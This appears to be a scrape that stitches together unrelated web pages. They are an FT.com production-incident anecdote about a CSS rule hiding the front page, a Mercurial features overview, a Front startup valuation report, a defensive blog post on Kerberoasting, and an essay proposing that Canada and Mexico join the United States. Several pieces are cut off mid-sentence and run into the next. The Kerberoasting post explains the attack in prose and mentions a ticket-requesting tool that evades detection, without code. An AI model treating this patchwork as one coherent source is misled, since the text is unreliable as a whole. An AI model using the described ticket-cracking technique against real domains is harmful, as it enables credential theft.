<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>My most cherished production incident.</p><div>
		
		
		<span>November 30 2020</span>
		
		
<p>In my short career as a Software Engineer, I've been involved with countless production incidents - from leap seconds, to sharks, to the <a href="https://medium.com/ft-product-technology/a-chaos-test-too-far-6405c2cc4bbb">classic database deletions</a>. But there's one story that will always retain a special place in my heart.</p>
<p><img src="https://www.thegadhian.com/posts/display-none/prize.png" alt=""></p>
<hr>
<p><strong>March 16th, 2016</strong>. I was a recently promoted senior engineer, tasked with getting advertising on the new version of FT.com.</p>
<p>The FT.com rebuild - codename <em>Next</em> - had been in beta for a while, and was gearing up towards a full roll-out later that year. Just the day before we had increased the amount of traffic going to the new site from 2% to 10% of logged-out users, so it was very much considered a production site.</p>
<p>That day was Budget Day in the UK, up there with elections as one of the busiest traffic days for FT.com. As with every major news event, we were on a period of "heightened awareness" - essentially avoid doing anything risky.</p>
<p><img src="https://www.thegadhian.com/posts/display-none/budget.png" alt="my boss telling us to be careful"></p>
<p>With Next, we went to great efforts to ensure that deploying code to production was simple and painless. The site was split into many <em>microservices</em> (e.g. front page, article page, sign up form), each comprising of some API calls and some front end <em>components</em>. We had automated tests on every build that checked all the important pages were rendering, as well as monitoring to ensure the live site was OK. And so we'd be happily deploying to production dozens of times a day.</p>
<p>My task: hide one of the ad elements from all our pages. It was a shared component, with some CSS that targeted all the various different parts of the site using a data attribute on the body. A simple one line change plus a copy/paste job. I pushed the change up, got it reviewed, merged it, and released all the apps.</p>
<pre><code>[data-page-type="article-page"] {
	.my-advert {
		display:none;
	}
}
</code></pre>
<pre><code>[data-page-type="list-page"] {
	.my-advert {
		display:none;
	}
}
</code></pre>
<pre><code>[data-page-type="front-page"] {
	display:none;
	.my-advert {
	}
}
</code></pre>
<p><em>15 minutes later...</em></p>
<p><img src="https://www.thegadhian.com/posts/display-none/homepage.png" alt="Screenshot of the website with no content"></p>
<p>None of the tests failed - all the pages were returning valid HTML. Pingdom was getting 200 OK responses for the front page.</p>
<p><img src="https://www.thegadhian.com/posts/display-none/devtools.png" alt="Dev tools showing display: none on the whole content"></p>
<p>We had lots of safeguards in place to handle a broken website. Even if snuck got through our build process, we had <a href="https://developer.fastly.com/learning/concepts/stale/">Fastly</a> serving <code>stale-if-error</code>. And if a user still saw an error page, they'd not only get treated to some delightful economics jokes, but critically they'd have been able to opt-out to go back to the old/current at the time FT.com.</p>
<p><img src="https://www.thegadhian.com/posts/display-none/optout.png" alt="My boss smiling at the fact that the opt out link was also hidden"></p>
<p>None of that applies if someone just hides it all.</p>
<hr>
<p>I'm sure there were many learnings from this. We had an incident report, with some actions. Some were probably carried out, some not.</p>
<p>I'm sure this tale might also provide a glimmer of inspiration or comfort to anybody else that has made mistakes in their job.</p>
<p>That's not why I wanted to write about it.</p>
<p>It was just pretty funny is all.</p>

      <article id="modern-mercurial">
	<div>
	  

	  <section>
	    
<p>Mercurial draws a wide range of opinions from its users, both former and
current, and even from those who have not tried it yet. Such opinions range
from "it's super easy, way simpler to use than Git" to "it's slow and the UX
sucks", along with "Mercurial? Isn't it dead?" and "It's not on Github"
and the (usually) more quiet "I like the features" and "it scales very well".</p>
<p>Like with most technical discussions, whether any opinion is "right" really
depends on who you ask.</p>
<p>In the case of 15 year-old software like Mercurial, <strong>when</strong> you've asked a
particular question is important, as things may have changed from when you last
made up your mind. Your workflow might not be well supported, the tools you
need might not exist... you might also just not like it.</p>
<p>Our goal with this article is to re-state some of the evolutions that Mercurial
has seen over the past few years and to review some of its strong points and
weaknesses.</p>
<p>Hopefully, you come out of this read with more up-to-date information to help
you take informed decisions about the tools you're using.</p>

<h2>Phases</h2>
<p>Phases have been introduced to Mercurial in version 2.1 (2012) and have become
one of its central workflow features.</p>
<p>Every changeset (or "commit") is in one of three phases: <code>public</code>, <code>draft</code> or
<code>secret</code>.</p>
<p>By default, when you commit something, it's in the <code>draft</code> phase;
that means that you can change it, move it in history and even delete it using
any of the many history-rewriting commands in Mercurial (more on that later).
The public phase is meant to make changesets immutable: once they're <code>public</code>,
you <strong>cannot</strong> change anything about them, all rewriting commands will abort
when used on a <code>public</code> changeset.</p>
<p>This is useful as a project management tool, much like you would use protected
branches in forges such as GitLab, but built-in to your VCS and more granular.
You communicate to all other contributors that these changes can be relied on
for future work, your CI will not fail because your hash does not exist
anymore, etc. This means that this additional protections is <em>preventive</em>, and
saves you time in the long run.</p>
<p>The secret phase is simply useful to commit changes that you do not want to
share, like local config files for example.</p>
<h2>Distributed history rewriting</h2>
<p>Because Mercurial is a distributed tool, whenever you rewrite history (change
the contents, move changesets around, etc.), you run into the risk of
conflicting with or erasing the work of other people.</p>
<p>Users of other DVCS usually come up with rules (be they enforced by humans or
through an ad-hoc permissions system) to prevent the pitfalls of concurrent
editing.</p>
<p>Mercurial takes a different approach that, to our knowledge, is unique among
DVCS: distributed history rewriting should not only be possible, but <strong>safe</strong>
and with very little friction.</p>
<p>Enter "Changeset Evolution": Mercurial keeps records of every operation you've
made on your history and shares them along with the standard history. 
This enables automated conflict resolution when sharing history, turning a 
usually very tedious task into a simple one-command fix.
The core concept was introduced in the <code>evolve</code> extension and subsequently
integrated in Mercurial itself. Some commands and experimental features still 
reside in <code>evolve</code> where they can be iterated on and changed faster according
to user feedback.</p>
<p>Old commands and extensions have been ported years ago to use the new mechanism
like the standard <code>rebase</code>, <code>histedit</code> (similar to Git's interactive 
rebase) and <code>absorb</code>, if <code>evolve</code> is detected. This last one is a tool that 
automatically finds where to amend the different bits of your working directory
into the right changesets and does so interactively.</p>
<p>You can run <code>hg help evolve --extension</code> to get more precise info and a list
of all commands (scroll down for how to install it).</p>
<h2>Feature branches</h2>
<p>Mercurial has had the concept of branches since its very inception. These
branches differ from what Git calls branches: they are not pointers to a
changeset, but instead refer to a set of changesets that may grow over time. 
They are often used to separate different long-term development
efforts. In the Mercurial repository itself, you have the "default" and the
"stable" branches, the latter corresponding to the latest stable release and
any other bugfixes since that release. A changeset always belongs to a named
branch, "default" being the... default.</p>
<p>The Mercurial community struggled to define a nice way to handle 'topic' 
branches (sometimes also called 'feature' branches), especially when it comes
to sharing them with other people mainly for code review or collaborating.</p>
<p><code>topic</code> is an extension created in 2015 that addresses that problem in a way
that integrates nicely with Changeset Evolution and does not get in the way of
its users. While still experimental, topics are used by a lot of people from
different background, in different companies and the overall feedback is
overall very positive.</p>
<p>Topics differ from Git branches in that each changeset carries the topic
information, as opposed to just the tip of the "branch". The user can clearly
differentiate multiple topics, switch from one to the other, manipulate history
within the current topic, etc.</p>
<p>Finally, topics are temporary and fade out once the changesets are published.</p>
<p>This is the workflow that <a href="https://heptapod.net/">Heptapod</a> chose when adapting
GitLab to Mercurial.</p>
<h2>Other powerful features</h2>
<p>Mercurial supports a functional language for selecting a set of revisions.
Expressions in this language are called revsets; most commands have a <code>--rev</code>
argument. Here are a few examples:</p>
<ul>
<li><code>hg diff -r 1.0::.</code> will show the diff for all revisions from the <code>1.0</code> tag 
up to the current revision</li>
<li><code>hg rebase -r my-topic -d "branch(default) and public()"</code> will rebase all
changesets in <code>my-topic</code> onto the public tip of the default branch.</li>
<li><code>hg log -r "(keyword(bug) or keyword(issue)) and not ancestors(tag())"</code> will 
list changesets mentioning "bug" or "issue" that are not in a tagged release.</li>
</ul>
<p>This allows you to build complex queries that would otherwise require writing
a script or hoping that developers thought to include a certain flag on the
specific command you're using.</p>
<p>Finally, another common and powerful feature of Mercurial is its templating
system. Almost any command's output can be customized from the command line, 
without external tools, simplifying a lot of tasks that would otherwise require
heavy scripting. Here are a two examples:</p>
<ul>
<li><code>hg log -T"{node|short}\n"</code> will list the short hashes of all revisions,
separated by a newline</li>
<li><code>hg log -T. -r "author(rgomes) and date(2020)" | wc -c</code> will output one <code>.</code>
character for each revision Raphaël wrote in 2020. <code>wc -c</code> counts these dots
to give you the sum</li>
<li><code>hg log -r 0 --template "{ifeq(branch, 'default', 'on the main branch', 
  'on branch {branch}')}\n"</code> uses a conditional to test for the default

<p>Backwards-compatibility is one of the strengths of Mercurial, but also one of
its weaknesses. A Mercurial 5.5 client will work against a 0.9 server just
fine, and the vast majority of users will <strong>never</strong> encounter a breaking
behavior change when upgrading.</p>
<p>However, (almost) never breaking backwards compatibility also means being stuck
with the choices made as long ago as 2005, forever. This includes default
configuration options and user-facing behavior, both of which can be very
subjective (more on that below).</p>
<p>There exists a <code>tweakdefaults</code> config knob that enables recommended defaults
for various commands, blessed by the maintainers.</p>
<p>Additionally, here is our take on a simple config to get you started with
modern Mercurial.
Other Mercurial users and contributors will have differing opinions and other
suggestions, but this is what works for us.</p>
<div><pre><span></span><span>[ui]</span>
<span># Explained above</span>
<span>tweakdefaults</span> <span>=</span> <span>true</span>
<span># Merge conflict markers in files (they look like "&lt;&lt;&lt;&lt;&lt;&lt;&lt;") are more verbose</span>
<span>mergemarkers</span> <span>=</span> <span>detailed</span>
<span># Uses the internal non-interactive simple merge algorithm for merging</span>
<span># files. It will fail if there are any conflicts and leave markers in the</span>
<span># partially merged file. Marker will have three sections, one from each</span>
<span># side of the merge and one for the base content.</span>
<span>merge</span> <span>=</span> <span>:merge3</span>

<span>[commands]</span>
<span># Require the user to pass a revision (or revset) to "push" instead of pushing</span>
<span># all heads by default.</span>
<span>push.require-revs</span> <span>=</span> <span>true</span>

<span>[paths]</span>
<span># Default to the current revision (`.`) when pushing to `default`. </span>
<span>default:pushrev</span> <span>=</span> <span>.</span>

<span>[phases]</span>
<span># "Server-side" configuration. If you or anyone else pushes to this Mercurial</span>
<span># install, the changesets will not be published, contrary to the default.</span>
<span>publish</span> <span>=</span> <span>false</span>

<span>[extensions]</span>
<span># ==== "Core" extensions ====</span>
<span># Extensions that come pre-packaged with Mercurial:</span>

<span># Adds the `rebase` command</span>
<span>rebase</span> <span>=</span>
<span># Shelve is like Git's `stash`</span>
<span>shelve</span> <span>=</span>
<span># Similar to Git's interactive `rebase`</span>
<span>histedit</span> <span>=</span>
<span># Automatically finds where to amend the different bits of your working</span>
<span># directory into the right changesets and does so interactively.</span>
<span>absorb</span> <span>=</span>

<span># === External extensions</span>

<span># These two are installed with `pip install hg-evolve`.</span>
<span># Additional commands and features on top of Mercurial's "Changeset Evolution"</span>
<span>evolve</span> <span>=</span>
<span># Adds support for topics and new commands like `topic`, `stack`...</span>
<span>topic</span> <span>=</span>

<span>[experimental]</span>
<span># Force the user to specify the topic when committing.</span>
<span># Use `topic-mode = random` to generate a random topic name</span>
<span>topic-mode</span> <span>=</span> <span>enforce</span>
<span># Force Mercurial to use Changeset Evolution for all commands even when evolve</span>
<span># is not found</span>
<span>evolution</span> <span>=</span> <span>all</span>

<h2>Slowness</h2>
<p>Mercurial suffers from a "slowness threshold": most commands will run slower
on a small repository than a comparable command would in Git. This is in part
due to Mercurial being written in Python, which has a slow startup, and leads
the user to believe that this slowness will get worse the larger the repository.</p>
<p>This is however largely untrue, as the vast majority of Mercurial was designed
to handle large repositories and scale well as one of its primary goals, hence
why a lot of big companies use it.</p>
<p>This is not to say that the situation cannot be …</p></section></div></article></div></div>

And Front was, at first, popular mostly with support teams and other teams that deal with a high volume of customer inquiries. But over time, Front has grown from being a product for a specific kind of workflow to being a tool that people use across organizations.</p><p>The fact is that most companies are still stuck in time from twenty years ago when it comes to managing how they triage, assign, and respond to all those emails. That's a big pain point, because as it turns out, a lot of the critical work that companies do takes place over email. </p><p>What Front has realized is that owning the orchestration and collaboration around email puts them in a position to “back into” $66B worth of vertical markets—CRM, project management, knowledge management, conversational marketing, and others.</p><p>To show the size of that opportunity and demonstrate the progress that Front has made towards its goal in this report, we aggregated all the public data out there on Front, then extrapolating and interpolating to fill in the gaps using backchannels to confirm our numbers.&nbsp;</p><p>We learned that Front, like Slack, has consumer-grade engagement, elite compounding revenue from their land and expand strategy, and increasingly broad adoption inside teams.</p><p>By focusing on external vs. internal communication, however, Front may also have a TAM that is several times as large as Slack's.</p><h2 id="front-s-roadmap-to--2b--4b--20b">Front's roadmap to $2B/$4B/$20B</h2><ul><li><strong>Our financial model values Front at $1.3B, with a price per share around $11.</strong> At their Series C in January, they were valued at $920M, or about $7.70~ per share.</li><li><strong>Front is currently trading on the secondary market between $7.25 and $9.00 per share.</strong> 5-year IRR for each scenario in our model ranges from 3% to 22% in the bear case, 22% to 46% in the base case, and 84% to 118% in the bull case.</li><li><strong>Front is like Slack for email</strong>. It is a multiplayer tool that lets teams better communicate—via chatting with other team members within the context of a personal or shared inbox—and coordinate—via tagging, rules, and 3rd-party integrations—how they respond to email.</li><li><strong>Front's 72% DAU/MAU ratio is on par with elite, consumer-grade apps</strong>. WhatsApp was at 70% pre-Facebook acquisition. Combined with its 148 minutes of average active daily usage (compare to Slack at 90 minutes) Front effectively has the engagement of a high-grade consumer app.</li><li><strong>Front's 137% net dollar retention demonstrates they are landing and expanding with an extremely efficient bottom-up model.</strong> Compare to 143% for Slack at IPO and 140% for Zoom at IPO.</li><li><strong>Zendesk and Intercom pose a threat because they have much deeper access to customer data. </strong>Intercom embeds itself in their customers' websites, giving them direct insight into the behavior of their customers, while Zendesk serves as a centralized hub for all things sales, support, and/or knowledge management for hundreds of thousands of companies.</li><li><strong>However, Front's high engagement platform makes them attractive to third-party developers. </strong>The more activity Front can promote on its platform, and the larger the variety of integrations their customers are using, the more adoption they'll have inside organizations and the wider their moat—based on the cost of switching away to another email product—will become.</li><li><strong>Expanding across organization opens up the opportunity to "back into" $66B worth of adjacent vertical markets </strong>. While today Front is focused on facilitating third-party integrations to tools like Hubspot, Marketo, and Salesforce, building their own versions of these products would allow them to (at minimum, and per product) 2-3x their average revenue per user—today, Zendesk's Enterprise plan costs $199 a seat, while Front's most expensive plan is just $79 per seat.</li><li><strong>Building their own vertical solutions also puts Front on a converging course with Salesforce ($226B), Microsoft ($1.63T), and Google ($1.19T).</strong> Front's endgame is essentially to recreate the Google or Office 365 suite. But Microsoft was able to overtake Slack's active user count within just two years—a company that had similar ambitions. The threat Microsoft/Google pose and their ability to freely push copycat products to a user base of millions could make it extremely challenging for Front to move upmarket and reach enterprise scale.</li><li><strong>Front's product also makes them an attractive acquisition target. </strong>Rather than attempt to build their own team email product, Microsoft and/or Google could buy Front. That said, Salesforce is the company most likely to acquire Front—both because they don't have any email tool of their own yet and because there's no risk of cannibalization or customer confusion as there would be with a Microsoft/Google acquisition.</li><li><strong>Ultimately, Front’s consumer-grade engagement and ability to achieve org-wide adoption position them well to compete on their own in the cloud productivity space</strong>. Most deep workflow products serve specific functional units (Intercom, Zendesk, Salesforce) while products that serve whole teams (Outlook, Gmail) have only superficial access to customer data. Front, on the other hand, is a workflow product and an org-wide tool all in one: a combination that could make them a formidable competitor even to the 800 lb. gorillas of B2B SaaS.
</li></ul><h2 id="valuation--front-is-worth--1-3b">Valuation: Front is worth $1.3B</h2><p>Today, based on our model, we estimate Front is worth about $1.3B, with a fair share price of $9.5 to $11.</p><p>That’s up 40% from Front’s Series C, which valued the company at about $7.7 per share or $920M post-money. At the time, Front was at $26M ARR growing 5% CMGR6 for a 35x multiple.&nbsp;</p><p>Today, we project Front is at about $38M ARR or $3.1M MRR, growing 3% CMGR6.&nbsp;</p><img src="https://images.prismic.io/sacra/731caebc-6ce9-4c26-8451-56f39d4618df_image13.png?auto=compress,format"><p><em>Applying the 35x multiple from Front’s last round to their current $38M revenue run rate gives us a valuation of $1.3B and an implicit per share price of $11. <a href="https://sacra.com/research/front-initiating-coverage-research-report/access" rel="noopener noreferrer" target="_blank">Click here</a> to get the full data set.</em></p><p>Slack, for reference, was growing at 12% CMGR6 at the same ARR. According to our model, Front hasn’t grown at more than 10% CMGR6 since the summer of 2017, with growth hanging steady around 5% CMGR between April 2019 and early 2020, then declining slightly with the onset of COVID-19 in March.&nbsp;</p>

Gartner estimates 1 billion knowledge workers worldwide. A 20% paid conversion rate with $100 - $300 contract value per year per user suggests $20 – 60 billion TAM.&nbsp;</p><p>Looking towards the future, Front’s bear, base, and bull cases hinge largely on whether the company’s growth will re-accelerate or whether it will continue to decline, and if so, how quickly it will do so:</p><ul><li>Our 5-year bull case has Front growing at 70% CAGR and reaching a $19B valuation ($600M ARR at a 30x multiple).</li><li>Our base case has them slowing to a steady 30% growth rate and being valued at a more modest $3.8B ($139M ARR on a 25x multiple).&nbsp;</li><li>In our bear case, Front’s growth slows even further, with the company reaching a …</li></ul></section></article></div></div>

<p>Microsoft released a new detection this month for <a href="https://docs.microsoft.com/en-us/defender-for-identity/whats-new">Microsoft Defender for Identity</a>. The detection detects “Suspected Kerberos SPN exposure,” which is an attack called Kerberoasting. This blog post will briefly explain what a Kerberoasting attack is and how to mitigate it.</p>



<p>Kerberoasting is not a new attack. The detection by Microsoft Defender for Identity is, though. People like <a href="https://blog.harmj0y.net/">harmj0y</a>, <a href="https://adsecurity.org/?author=2">Sean Metcalf</a>, and many others documented Kerberoasting well, but since the detection is new in Microsoft Defender for Identity, I will briefly go through the attack.</p>



<h2><strong>Kerberos</strong></h2>



<p>To understand Kerberoasting, we first need to know how Kerberos works. Kerberos is an authentication protocol based on tickets. The protocol is an authentication protocol developed by MIT and adopted by Microsoft since Windows 2000. Kerberos is also complicated and hard to secure.</p>



<p>For a client to access a service (a SQL server, a web server, a network share, etc.), the client needs to authenticate and request a Ticket Granting Service (TGS) ticket from the Key Distribution Center (KDC). The Key Distribution Center exists of two components: the Authentication Service (AS) and the Ticket Granting Service. Within a Microsoft environment, the Key Distribution Center is the Domain Controller. With a valid Ticket Granting Service ticket, the client can access the requested service.</p>



<p>Here is an oversimplified overview of these ticket requests:</p>



<div><figure><img data-attachment-id="991" data-permalink="https://thalpius.com/microsoft-defender-for-identity-kerberoasting-01/" data-orig-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg" data-orig-size="1107,340" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Microsoft Defender for Identity Kerberoasting 01" data-image-description="" data-medium-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=300" data-large-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=720" src="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=720" alt="" srcset="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=720 720w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=150 150w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=300 300w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=768 768w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg?w=1024 1024w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-01.jpg 1107w" sizes="(max-width: 720px) 100vw, 720px"><figcaption>Image 1: Requesting a TGT and TGS</figcaption></figure></div>



<p>First, the client needs to authenticate. The Authentication Service handles the authentication. The client sends a Ticket Granting Ticket (TGT) request and encrypts the timestamp in the request with the users’ password hash. Active Directory holds the password hashes of all users.<strong>&nbsp;</strong>If the Domain Controller can decrypt the request and validates the user authentication, the Domain Controller sents a valid Ticket Granting Ticket.</p>



<p>With a valid Ticket Granting Ticket, the client can now request a Ticket Granting Service ticket. This part is essential: Anyone with a valid Ticket Granting Ticket can ask for a Ticket Granting Service ticket. The Ticket Granting Service ticket is encrypted with the hash of the user’s password the service belongs to (the Service Principal Name property within Active Directory on the object).</p>



<p>With a valid Ticket Granting Service ticket, the client can access the requested service.</p>

<h2><strong>Kerberoasting</strong></h2>



<p>Now that we know how Kerberos works in a nutshell, we can take a look at Kerberoasting.&nbsp;Remember that the Domain Controler uses the users’ password hash to encrypt the Ticket Granting Service ticket.&nbsp;Suppose an attacker requests a Ticket Granting Service ticket and uses a password list to brute-force the ticket, and the password is weak enough. In that case, the attacker can figure out the password by brute-forcing the ticket and obtain the password for that user. This attack is called Kerberoasting.</p>



<p>There is an option to enable a more robust encryption algorithm in Active Directory on the user object hence harder to brute-force:</p>



<div><figure><img loading="lazy" data-attachment-id="999" data-permalink="https://thalpius.com/microsoft-defender-for-identity-kerberoasting-03/" data-orig-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg" data-orig-size="616,807" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;thalpius&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Microsoft Defender for Identity Kerberoasting 03" data-image-description="" data-medium-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=229" data-large-file="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=616" src="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=616" alt="" width="308" height="404" srcset="https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=308 308w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=114 114w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg?w=229 229w, https://thalpius.files.wordpress.com/2020/11/microsoft-defender-for-identity-kerberoasting-03-1.jpg 616w" sizes="(max-width: 308px) 100vw, 308px"><figcaption>Image 3: Kerberos AES support</figcaption></figure></div>



<p>Unfortunately, this option is only to&nbsp;<em>support</em>&nbsp;AES. If an attacker requests an RC4 (weaker encryption) encrypted ticket, the Domain Controller still sends a ticket with RC4 encryption, which is easier to brute-force than AES.</p>



<h2><strong>Mitigation</strong></h2>



<p>Since the ticket needs to be brute-forced, a strong and complex password is the best mitigation for this attack. Even if the ticket can be requested using RC4 encryption, a generated and lengthy password is hard to brute-force. Use a generated and lengthy password for all service accounts that contain a Service Principal Name.</p>



<p>If Microsoft Defender for Identity detects a Kerberoasting attack, reset the password for the user account, and isolate the machine where the attack takes place. Investigate for malicious activities once mitigated the attack on the endpoint.</p>



<p><strong>Note:</strong>&nbsp;Microsoft Defender for Endpoint contains an option to isolate the device. You will be able to reconnect the device back to the network at any time. The button on the device page will change to say&nbsp;<em>Release from isolation</em>, and then you take the same steps as isolating the device.</p>



<h2><strong>Conclusion</strong></h2>



<p>Kerberoasting is an attack a lot of attackers use because it is beneficial and hard to detect. Now that Microsoft Defender for Identity detects Kerberoasting it is a good start. Hopefully, other Kerberos attacks will get detected by Microsoft Defender for Identity soon.</p>



<p>I have created a small C# project that requests a Ticket Granting Service ticket using KerberosSecurityTokenProvider to use for Kerberoasting. I started the project for educational purposes only, but the tool works fine and is <strong><em>not</em></strong> detected by Microsoft Defender for Identity.</p>

            <section>
                <div>
                    <p>For nearly 200 years, the United States continually admitted new states to the Union. But after Hawaii became the 50th state in 1959, expansion halted. Along with America’s <a href="https://www.amazon.com/Rise-Fall-American-Growth-Princeton/dp/0691175802/">broader stagnation</a>, population growth has slowed.</p><p>In the 20th century, America defeated fascism and communism. Her hegemony, while marred by myriad missteps, ushered in an era of unprecedented peace, prosperity, and liberty. But if America is to defend her hegemony, she must grow again. Scale is essential for innovation and economic growth and underpins America’s military strength. 330 million Americans simply won’t be able to compete against 1.4 billion Chinese. Globalization and free trade aren’t a substitute for scale either, for they deprive the nation of its autonomy in world affairs.</p><p>The solution is for Canada and Mexico to join the Union—i.e., for Canada and Mexico, or their constituent states, to be voluntarily admitted into the United States. America and her institutions are uniquely suited to accommodating this larger and more heterogenous Union and to forging a common political community. The example of German reunification demonstrates that economic convergence is possible too, as I will explain. In addition to reenergizing America, propelling economic growth, and making Americans better off, this would have extraordinary benefits for Canadians and Mexicans too. In particular, tens of millions of Mexicans could be lifted out of poverty.</p><p>In his excellent recent book, <a href="https://www.amazon.com/One-Billion-Americans-Thinking-Bigger/dp/0593190211/"><em>One Billion Americans</em></a>, Matthew Yglesias argues for massive population growth as well, though he proposes achieving this through subsidizing fertility and increasing immigration. In practice, these proposals may not rise to the challenge. If the choice America faces is between decadent decline or renewed growth, an expanded Union may be our best bet for the latter.</p><p>To be clear, I realize that this is a somewhat crazy idea. So don’t take take this essay as a wholesale endorsement of the proposal. But I do think it is an idea worth exploring—if only for the sake of expanding our conception of the possible. I invite you to explore it with me.</p><h2 id="bigger-is-better">Bigger is Better</h2><p>A central concept in growth economics is that of “increasing returns to scale”: essentially, bigger is better. A larger population and a larger market benefits all.</p><p>A larger population enables more innovation. More people means there are more creative minds with new ideas and inventions. In turn, more people means more customers, so a new invention is more profitable, incentivizing firms to invest in research and development. This drives economic growth.</p><p>A larger market also enables more specialization. One city can focus on developing software, another on manufacturing cars, a third on financial services. This specialization makes firms and workers more productive, again driving economic growth.</p><p>Think of it this way. A small country would struggle to support an ambitious space program; the cost would be too high. But a large country <em>can</em> support an ambitious space program; distributed over a large population, the cost per person is manageable. The same principle applies to things like medical research, technological development, and military investment.</p><p>This logic of increasing returns to scale underpinned much of the economic case for globalization. The free exchange of goods and people would make us all better off, the high priests of economics told us. And they were right! We can all enjoy Silicon Valley’s software and Germany’s cars. A German-American pharmaceutical collaboration, headed by Turkish and Greek immigrants, <a href="https://www.nytimes.com/2020/11/10/business/biontech-covid-vaccine.html">recently created</a> the first vaccine shown to be effective against Covid-19. The gains to scale through globalization have been extraordinary.</p><p>So, then, the solution to the quest for scale is globalization? We don’t need a larger America after all—free trade agreements like NAFTA are enough?</p><p>The problem with globalization is that it deprives the political community of its autonomy—particularly in that most essential realm of war and peace. The nation can no longer determine its own destiny, but rather becomes dependent and vulnerable and subject to whim of others.</p><p>For instance, as the American establishment has become clearer-eyed about the rise of authoritarian China, they have suddenly realized that maybe, <em>just maybe</em>, outsourcing much of America’s manufacturing there was a bad idea. If the Chinese acted on their expansionist ambitions, would America be able to push back—or would we be cowed by the cutoff of the supply of new iPhones and a tanking stock market?</p><p>Even trade with allies who purport to share our values is questionable in this regard. If push came to shove and a general war broke out, could America <em>really</em> rely on the German industrial base to start mass producing weapons? Honestly—probably not. America prevailed in WWII because she could mobilize her epic industrial might to produce an “arsenal of democracy.” If America were once again to find herself in an existential struggle, I fear she would not be able to pull off that same feat again.</p><p>This deprival of the political community’s autonomy is what so many Europeans despise about the European Union. While the cosmopolitan elite may identify as “European,” first and foremost most Germans still think of themselves as German, most French people still as French, and most Britons still as British. Their political community is their nation, not the EU. So when an EU technocrat—someone they didn’t elect, much less identify with—tells them how to live their lives, they rebel.</p><p>This has led to an instinct of retrenchment and a push to reverse globalization, most famously Trump’s trade wars. What this gets right is how interdependence has undermined America’s independence. If America can’t defend her core interests and values because she is entirely dependent on others, her hegemony becomes a farce.</p><p>What this gets wrong is that America, alone, with its puny 330 million people, will not be able to compete. America’s hegemony rests on her economic might, sustained by her roaring engine of innovation. America’s economy in turn supports her dominant military. But without the benefits of scale, America will not be able to sustain her economic primacy. 1.4 billion Chinese will be able to outpace and out-innovate 330 million Americans if they try go it alone.</p><p>Without scale, America will decline; her hegemony will wither. But increased scale through globalization robs America of her freedom to act; her hegemony become toothless. How, then, to square the circle?</p><p>There is one possibility. Rather than enmeshing America with foreign countries, make America itself bigger! Enlargen the political community! A bigger nation can enjoy the innovation and specialization made possible by scale. But it also retains its autonomy. Though larger, the nation is still a coherent political community that can determine its own fate.</p><p>Arguably, this is what America has always done. It expanded from one coast to another and rapidly grew its population. That’s how America became the hegemon in the first place, replacing the smaller British. But America now stagnates: her territory fixed, her population growing ever-more slowly, ultimately unable to keep pace with the world’s rising powers. If America wants to preserve her hegemony, she must grow again.</p><h2 id="growing-america">Growing America</h2><p>A bigger America is exactly what Matthew Yglesias argues for in his excellent recent book, <a href="https://www.amazon.com/One-Billion-Americans-Thinking-Bigger/dp/0593190211/"><em>One Billion Americans</em></a>. Yglesias envisions this growth occurring through increased fertility and immigration—with the goal of, as the title indicates, a population of 1 billion. Directionally, this is sound. But, realistically, Yglesias’s proposals won’t get us anywhere close to the massive population growth he imagines.</p><p>America’s birth rate is already substantially below the replacement level. We could count ourselves lucky if Yglesias’s suite of proposed pro-natalist policies even got us back to replacement. Extensive family benefits like the ones he proposes have been tried in Europe, and they <a href="https://www.agglomerations.tech/taking-one-billion-americans-seriously/">haven’t yielded</a> a massive baby boom.</p><p>Similarly, America could definitely accommodate—and benefit from—significantly increased immigration. But I think Yglesias underestimates the political challenge of bringing in the requisite number—hundreds of millions—of immigrants. Sure, theoretically, we could raze our cities and build a sea of skyscrapers in their stead to accommodate the newcomers. But the forces of <a href="https://en.wikipedia.org/wiki/NIMBY">NIMBYism</a> in America are already so strong as to block nearly all new construction in our powerhouse metropolises. Sure, theoretically, we could remake the cultural and ethnic mix of our communities with new arrivals of all colors and creeds. But the forces of nativism in America are already so strong as to barely tolerate 